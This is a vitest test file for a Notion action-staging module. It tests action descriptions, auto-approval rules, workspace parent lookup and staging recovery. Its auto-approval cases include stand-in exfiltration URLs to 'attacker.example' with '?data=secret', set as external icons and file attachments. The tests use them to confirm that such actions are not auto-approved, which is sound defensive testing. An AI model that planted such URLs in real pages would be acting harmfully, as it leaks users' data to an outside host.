import { describe, expect, it } from "vitest";
import {
  AUTO_APPROVABLE_KINDS,
  applyStoredAction,
  describeAction,
  findWorkspaceParentPage,
  NotionStore,
  stageAction,
  type NotionAction,
} from "../src/notion-actions";

const databaseRow = (titlePropertyName?: string) => describeAction({
  type: "createPage",
  provisionalId: "~1",
  parent: { kind: "database", databaseId: "db-1" },
  title: "Row title",
  titlePropertyName,
});

const inline = (label: string, value: string) => ({ label, kind: "inline", value });
const labels = (fields: { label: string }[] | undefined) => fields?.map(field => field.label) ?? [];

describe("describeAction", () => {
  it("names the page an edit targets", () => {
    const { description, fields, descriptionIsComplete } =
      describeAction({ type: "appendContent", pageId: "page-1", markdown: "Hello" });

    expect(descriptionIsComplete).toBe(true);
    expect(fields).toContainEqual(inline("Page ID", "page-1"));
    expect(description).not.toContain("earlier action");
  });

  it("says a provisional page ID names a page created in this workspace", () => {
    const { description, fields } = describeAction({ type: "addComment", pageId: "~3", text: "Hi" });

    expect(fields).toContainEqual(inline("Page ID", "~3"));
    expect(description).toContain("created by an earlier action in this workspace");
  });

  it("omits the title field when a database row takes its title from the properties", () => {
    const { fields } = describeAction({
      type: "createPage",
      provisionalId: "~1",
      parent: { kind: "database", databaseId: "db-1" },
      title: "Ignored",
      properties: { Task: { type: "title", text: "Real title" } },
    });

    expect(fields).toContainEqual(inline("Database ID", "db-1"));
    expect(labels(fields)).not.toContain("Title");
    expect(JSON.stringify(fields)).not.toContain("Ignored");
    expect(JSON.stringify(fields)).toContain('\\"text\\": \\"Real title\\"');
  });

  it("names the column a database row's title is written under", () => {
    const byDefault = databaseRow();
    expect(byDefault.descriptionIsComplete).toBe(true);
    expect(byDefault.fields).toContainEqual(inline("Title property", "Name"));
    expect(byDefault.fields).toContainEqual(inline("Title", "Row title"));
    const named = databaseRow("Task name");
    expect(named.descriptionIsComplete).toBe(true);
    expect(named.fields).toContainEqual(inline("Title property", "Task name"));
  });

  it("names no title column for a sub-page or a row titled by its properties", () => {
    expect(labels(describeAction({
      type: "createPage", provisionalId: "~1", parent: { kind: "page", pageId: "parent-1" },
      title: "Sub-page",
    }).fields)).not.toContain("Title property");
    expect(labels(describeAction({
      type: "createPage",
      provisionalId: "~1",
      parent: { kind: "database", databaseId: "db-1" },
      title: "Ignored",
      titlePropertyName: "Name",
      properties: { Task: { type: "title", text: "Real title" } },
    }).fields)).not.toContain("Title property");
  });

  it("shows an empty title when neither a title nor a title property is set", () => {
    const { fields } = describeAction({
      type: "createPage", provisionalId: "~1", parent: { kind: "page", pageId: "parent-1" },
    });

    expect(fields).toContainEqual(inline("Parent page ID", "parent-1"));
    expect(fields).toContainEqual(inline("Title", ""));
  });

  it("shows the workspace parent chosen at staging", () => {
    const { description, fields, descriptionIsComplete } = describeAction({
      type: "createPage",
      provisionalId: "~1",
      parent: { kind: "workspace", pageId: "recent-page", title: "Team notes" },
      title: "New page",
    });

    expect(descriptionIsComplete).toBe(true);
    expect(description).toContain("chosen now");
    expect(fields).toEqual(expect.arrayContaining([
      inline("Parent page ID", "recent-page"),
      inline("Parent page title", "Team notes"),
      inline("Provisional ID", "~1"),
      inline("Title", "New page"),
    ]));
  });
});

describe("auto-approval", () => {
  const icon = { emoji: "📝" };
  const externalIcon = { imageUrl: "https://attacker.example/icon.png?data=secret" };
  const verdicts: [NotionAction, string, boolean][] = [
    [{ type: "appendContent", pageId: "page-1", markdown: "Hello" }, "append-content", true],
    [{ type: "setTitle", pageId: "page-1", title: "New", previousTitle: "Old" }, "edit-pages", true],
    [{
      type: "setProperties", pageId: "page-1",
      properties: { Done: { type: "checkbox", checked: true } },
      previousProperties: { Done: { type: "checkbox", checked: false } },
    }, "edit-pages", true],
    [{ type: "setIcon", pageId: "page-1", icon, previousIcon: null }, "edit-pages", true],
    [{ type: "setIcon", pageId: "page-1", icon: null, previousIcon: icon }, "edit-pages", true],
    // Notion loads an external icon's URL whenever the page is shown, so the URL could carry data out.
    [{ type: "setIcon", pageId: "page-1", icon: externalIcon, previousIcon: icon }, "edit-pages", false],
    [{ type: "createPage", provisionalId: "~1", parent: { kind: "page", pageId: "page-1" } }, "create-pages", true],
    [{ type: "createPage", provisionalId: "~1", parent: { kind: "database", databaseId: "db-1" } }, "create-pages", true],
    [{
      type: "createPage", provisionalId: "~1", parent: { kind: "workspace", pageId: "page-1", title: "Home" },
    }, "create-pages", true],
    [{ type: "createPage", provisionalId: "~1", parent: { kind: "workspace" } }, "create-pages", true],
    [{ type: "createPage", provisionalId: "~1", parent: { kind: "page", pageId: "page-1" }, icon }, "create-pages", true],
    [{
      type: "createPage", provisionalId: "~1", parent: { kind: "page", pageId: "page-1" }, icon: externalIcon,
    }, "create-pages", false],
    // A files property holds external URLs that Notion loads in card previews, so it could carry data out too.
    [{
      type: "setProperties", pageId: "page-1",
      properties: { Attachments: { type: "files", files: [{ name: "p.png", url: "https://attacker.example/p.png?data=secret" }] } },
      previousProperties: { Attachments: { type: "files", files: [] } },
    }, "edit-pages", false],
    [{
      type: "setProperties", pageId: "page-1",
      properties: { Attachments: { type: "files", files: [] } },
      previousProperties: { Attachments: { type: "files", files: [{ name: "p.png", url: "https://example.com/p.png" }] } },
    }, "edit-pages", true],
    [{
      type: "createPage", provisionalId: "~1", parent: { kind: "database", databaseId: "db-1" },
      properties: { Attachments: { type: "files", files: [{ name: "p.png", url: "https://attacker.example/p.png?data=secret" }] } },
    }, "create-pages", false],
    [{ type: "restore", pageId: "page-1" }, "restore-pages", true],
    [{ type: "addComment", pageId: "page-1", text: "Hi" }, "post-comments", true],
    [{ type: "archive", pageId: "page-1" }, "trash-pages", false],
  ];

  it.each(verdicts)("gives %j the kind %s and verdict %s", (action, tag, autoApprovable) => {
    const description = describeAction(action);
    expect(description.actionKind?.tag).toBe(tag);
    expect(description.autoApprovable).toBe(autoApprovable);
  });

  it("never auto-approves moving a page to trash, which has a kind of its own", () => {
    const trash = describeAction({ type: "archive", pageId: "page-1" });
    expect(trash.autoApprovable).toBe(false);
    expect(AUTO_APPROVABLE_KINDS.map(kind => kind.tag)).not.toContain(trash.actionKind?.tag);
  });

  it("reports exactly the kinds of the auto-approvable actions, once each, with one label per tag", () => {
    const approvable = verdicts.filter(([, , verdict]) => verdict).map(([action]) => describeAction(action).actionKind);
    const byTag = new Map(approvable.map(kind => [kind?.tag, kind?.label]));
    expect(AUTO_APPROVABLE_KINDS.map(kind => kind.tag).toSorted()).toEqual([...byTag.keys()].toSorted());
    for (const kind of AUTO_APPROVABLE_KINDS) expect(kind.label).toBe(byTag.get(kind.tag));
    for (const kind of approvable) expect(kind?.label).toBe(byTag.get(kind?.tag));
  });
});

describe("findWorkspaceParentPage", () => {
  it("returns the most recently edited shared page", async () => {
    const searches: unknown[] = [];
    const store = {
      api: {
        search: async (body: unknown) => {
          searches.push(body);
          return {
            results: [{
              object: "page", id: "recent-page", url: "https://notion.so/recent-page",
              created_time: "2026-01-01T00:00:00Z", last_edited_time: "2026-01-02T00:00:00Z",
              properties: { title: { type: "title", title: [{ plain_text: "Team notes" }] } },
            }],
          };
        },
      },
    } as unknown as NotionStore;

    await expect(findWorkspaceParentPage(store)).resolves.toEqual({ id: "recent-page", title: "Team notes" });
    expect(searches).toEqual([{
      filter: { property: "object", value: "page" },
      sort: { direction: "descending", timestamp: "last_edited_time" },
      page_size: 1,
    }]);
  });
});

describe("stageAction", () => {
  function memoryStore(appended: string[]) {
    const kv = new Map<string, unknown>();
    const storage = {
      get: (key: string) => structuredClone(kv.get(key)),
      put: (key: string, value: unknown) => void kv.set(key, structuredClone(value)),
      delete: (key: string) => kv.delete(key),
      list: ({ prefix }: { prefix: string }) => [...kv].filter(([key]) => key.startsWith(prefix)),
    };
    const api = { appendBlockChildren: async (pageId: string) => { appended.push(pageId); return ["block-1"]; } };
    return new NotionStore(storage as never, api as never);
  }

  it("keeps an action applied before a lost submit reply, and reports it submitted", async () => {
    const appended: string[] = [];
    const store = memoryStore(appended);
    // An auto-approval applies the action before the reply, which then never arrives.
    const queue = { submitAction: async (id: number) => {
      await applyStoredAction(store, id);
      throw new Error("Network connection lost.");
    } };

    const id = await stageAction(store, queue as never, { type: "appendContent", pageId: "page-1", markdown: "Hello" });

    expect(appended).toEqual(["page-1"]);
    expect(store.getAction(id)).toMatchObject({ state: "applied", appendedBlockIds: ["block-1"] });
  });

  it("drops the record and fails when the submit fails without applying", async () => {
    const store = memoryStore([]);
    const queue = { submitAction: async () => { throw new Error("queue gone"); } };

    await expect(stageAction(store, queue as never, { type: "appendContent", pageId: "page-1", markdown: "Hello" }))
      .rejects.toThrow("queue gone");
    expect(store.getAction(1)).toBeUndefined();
  });
});
